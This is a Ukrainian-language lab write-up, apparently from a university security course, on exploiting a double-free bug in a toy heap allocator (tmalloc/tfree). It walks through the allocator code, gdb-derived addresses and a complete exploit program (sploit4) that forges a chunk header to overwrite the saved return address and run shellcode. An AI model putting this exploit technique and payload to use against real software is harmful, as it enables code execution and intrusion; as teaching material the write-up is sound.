# Doble free

У системі Unix та пізніше у стандартній бібліотеці C є функції для динамічного обробки змінної кількості пам’яті. Це дозволяє програмам динамічно запитувати блоки пам’яті в системі. Операційна система забезпечує лише системний виклик ‘brk’, щоб змінити розмір великого фрагмента пам’яті, який відомий як купа.

Поверх цього системного виклику розміщений інтерфейс tmalloc, який забезпечує шар між додатком та системним викликом. Він може динамічно розбивати великий одиничний блок на менші шматки, звільняти ці шматки на запит програми та уникати фрагментації при цьому.

Разберемось в tmalloc.c.

tmalloc:

```c
void *tmalloc(unsigned nbytes)
{
  CHUNK *p;
  unsigned size;
 


  if (bot == NULL)
    init();

  size = sizeof(CHUNK) * ((nbytes+sizeof(CHUNK)-1)/sizeof(CHUNK) + 1);

  for (p = bot; p != NULL; p = RIGHT(p))
    if (GET_FREEBIT(p) && CHUNKSIZE(p) >= size)
      break;
  if (p == NULL)
    return NULL;

  CLR_FREEBIT(p);
  if (CHUNKSIZE(p) > size)      /* create a remainder chunk */
    {
      CHUNK *q, *pr;
      q = (CHUNK *)(size + (char *)p);
      pr = p->s.r;
      q->s.l = p; q->s.r = pr;
      p->s.r = q; pr->s.l = q;
      SET_FREEBIT(q);
    }
  return FROMCHUNK(p);
}
```

> \[взяв з stdlib.h\] tmalloc повертає покажчик на місце в пам’яті для об’єкта або, якщо пам’яті запитуваного обсягу немає, NULL. Виділена область пам’яті не ініціалізується.

```c
void tfree(void *vp)
{
  CHUNK *p, *q;

  if (vp == NULL)
    return;

  p = TOCHUNK(vp);
  CLR_FREEBIT(p);
  q = p->s.l;
  if (q != NULL && GET_FREEBIT(q)) /* try to consolidate leftward */
    {
      CLR_FREEBIT(q);
      q->s.r      = p->s.r;
      p->s.r->s.l = q;
      SET_FREEBIT(q);
      p = q;
    }
  q = RIGHT(p);
  if (q != NULL && GET_FREEBIT(q)) /* try to consolidate rightward */
    {
      CLR_FREEBIT(q);
      p->s.r      = q->s.r;
      q->s.r->s.l = p;
      SET_FREEBIT(q);
    }
  SET_FREEBIT(p);
}
```

\[взяв з stdlib.h\] tfree звільняє область пам’яті, на яку вказує vp; Ця функція нічого не робить, якщо vр дорівнює NULL. У vp повинен стояти покажчик на область пам’яті, раніше виділену однією з функцій: tcalloc, tmalloc або trealloc.

Подвійні вільні помилки виникають, коли функція tfree\(\) викликається більше одного разу з одним і тим же адресою пам’яті в якості аргументу.

```c
int foo(char *arg)
{
  char *p;
  char *q;

  if ( (p = tmalloc(500)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    }
  if ( (q = tmalloc(300)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    } 

  tfree(p);
  tfree(q);

  if ( (p = tmalloc(1024)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    }

  obsd_strlcpy(p, arg, 1024);

  tfree(q);

  return 0;
}
```

Отже tfree\(q\), звільняє двічі - q. Оскільки вхідний буфер копіюється в розташування вказівника p, ми можемо довільно записувати туди, де знаходився звільнений q CHUNK. Коли знову викликається free на q, він, як правило, нічого не робить. Але з цією вразливістю ми зможемо створити CHUNK, який розміщемо у q, це дозволить вільно писати 4 байти в будь-якому місці, яке ми вибиримо в пам’яті.

```c
  if (q != NULL && GET_FREEBIT(q)) /* try to consolidate leftward */
    {
      CLR_FREEBIT(q);
      q->s.r      = p->s.r;
      p->s.r->s.l = q;
      SET_FREEBIT(q);
      p = q;
    }
```

Щоб створити цей CHUNK, ми спочатку встановлюємо FREEBIT на 1 в Сhunk, таким чином, функція tfree\(\) продовжуватиме намагатися звільнити цей CHUNK. Ми виготовляємо два інших CHUNK для лівого та правого покажчиків, які знаходяться по обидва боки q CHUNK. Правий CHUNK знаходиться вгорі в пам’яті, а лівий CHUNK знаходиться внизу, навпроти умовної позначки. Для цього sploit4.c нас цікавить лише лівий CHUNK, для якого ми також встановили FREEBIT.

```c
  q->s.r      = p->s.r;
  p->s.r->s.l = q;
```

Cпочатку цей код копіює правий вказівник створеного фрагмента в правий вказівник лівого CHUNK. Потім він записує покажчик лівого CHUNK в місце, вказане для лівого вказівника правого CHUNK. Якщо ми встановимо лівий покажчик для правого фрагмента як EIP, ми можемо самостійно направити адресу лівого CHUNK до нього.

```bash
user@vm-cs155:~/proj1/sploits$ gdb -e sploit4 -s /tmp/target4
(gdb) catch exec 
(gdb) r
(gdb) break foo 
(gdb) c
(gdb) info frame
...
 ebp at 0xbffffa6c, eip at 0xbffffa70
(gdb) break tfree
(gdb) c
(gdb) x vp
0x804a068 <arena+8>:    0x00000000
(gdb) x q
0x804a268 <arena>:0x00000000
(gdb) x p
0x804a060 <arena>:  0x00000000
```

Ми визнати, що початкова адреса, виділеної за допомогою p, дорівнює 0x804a068, а позиція, відведена q, дорівнює 0x804a268, тобто різниця становить 0x200 або 512 байт. Отже, коли другий раз p застосує 1024 байта, він перезапише вміст блоку q. Відповідно до функції \(макросу\) TOCHUNK, функція отримає відповідну адресу - 8 байт розташування адреси \(розмір блоку CHUNK становить 8 байт\), тоді інформація про блок, де зберігається q за адресою 0x804a268–8 = 0x804a260. Струкртура чанків:

```c
typedef union CHUNK_TAG
{
  struct
    {
      union CHUNK_TAG *l;       /* leftward chunk */
      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
    } s;
  ALIGN x;
} CHUNK;
```

Перші 4 байти є лівим покажчиком, а останні 4 байти - правим покажчиком, а наступні параметри будуть скопійовані в простір, на який вказує p, структура CHUNK soq, яка відповідає 504–512 байтам нашого корисного навантаження \(вхідний параметр\).

Залишилось лише сміття, написане в правому вказівнику лівого CHUNK. Коли EIP переходить на ліву адресу CHUNK, йому потрібно перестрибнути це сміття. У x86 ми використовували jmp 12 - “\xeb\x0c”, щоб перейти на 12 байт до розділу 0x90 NOP буфера. Код оболонки знаходився в кінці буфера. Отже, як тільки він перестрибує ці байти, лічильник програми буде переходити до шеллокода.

Sploit4:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char buf[1024];
  memset(buf, '\x90', sizeof(buf));
  memcpy(buf + 32, shellcode, strlen(shellcode));
  *(int *)(buf + 512 - 8) = 0x0804a068;
  *(int *)(buf + 512 - 4) = 0xbffffa70;
  *(int *)(buf + 4) = -1;
  *(short *)(buf) = 0x0ceb; 

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

